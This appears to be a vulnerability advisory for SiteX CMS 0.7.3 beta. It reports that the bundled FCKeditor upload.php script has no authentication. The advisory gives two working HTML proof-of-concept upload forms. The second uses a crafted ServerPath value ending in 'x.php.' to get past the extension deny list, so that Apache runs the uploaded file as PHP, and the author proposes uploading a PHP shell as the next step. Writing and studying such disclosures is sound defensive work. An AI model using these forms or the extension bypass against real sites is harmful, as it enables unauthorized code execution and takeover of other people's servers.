SiteX is a versitile web tool that will enable you to start your own
dynamic website in under 5 minutes. Driven by PHP and MySQL, SiteX
consists of components common to most personal and professional websites. 

Vulnerabilities: file upload possibilities
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

SiteX CMS contains third-party scripts from FCKeditor. One of them is:
"includes/fck/editor/filemanager/upload/php/upload.php". This particular
script does not have any checks against user validity and anyone can try
to upload files to SiteX-powered website.

Here is proof-of-concept file for testing:

------------>[proof-of-concept]<-----------
<html>
<body>
<center>
<form action="http://localhost/sitex.0.7.3.beta/includes/fck/editor/
filemanager/upload/php/upload.php?ServerPath=/sitex.0.7.3.beta/"
enctype="multipart/form-data" method="post">
<input type="file" name="NewFile" size="140">
<input type="submit" value="Test">
</center>
</body>
</html>
------------>[/proof-of-concept]<-----------

Parameter "ServerPath" must be changed as needed. Now, by using this
PoC upload file we can upload to victim server any files, except with
some predefined (dangerous) extensions.

$Config['DeniedExtensions']['File'] = array('php','php2','php3',
'php4','php5','phtml','pwml','inc','asp','aspx','ascx','jsp','cfm',
'cfc','pl','bat','exe','com','dll','vbs','js','reg','cgi') ;

But we really want to upload php scripts to victim webserver ...
Well, let's assume, that we have php file "test.waraxe". As we see,
file extension is "waraxe" :)
Now there is another PoC testfile:

------------>[proof-of-concept]<-----------
<html>
<body>
<center>
<form action="http://localhost/sitex.0.7.3.beta/includes/fck/editor/
filemanager/upload/php/upload.php?ServerPath=/sitex.0.7.3.beta/x.php."
enctype="multipart/form-data" method="post">
<input type="file" name="NewFile" size="140">
<input type="submit" value="Test">
</center>
</body>
</html>
------------>[/proof-of-concept]<-----------

And when we use this upload form, then we will have file named
"x.php.test.waraxe" in target webserver. Does anyone recall "RAR exploit"?
Google for "RAR exploit coppermine" and find out, that Apache webserver
has interesting feature: if we request file with unknown extension (".waraxe")
and if filename contains ".php.", then Apache will try to handle it as php file :)
So that we can now upload to webserver any php files and get php scripting level
access to target server. Next step can be uploading php shell and escalating
attack.
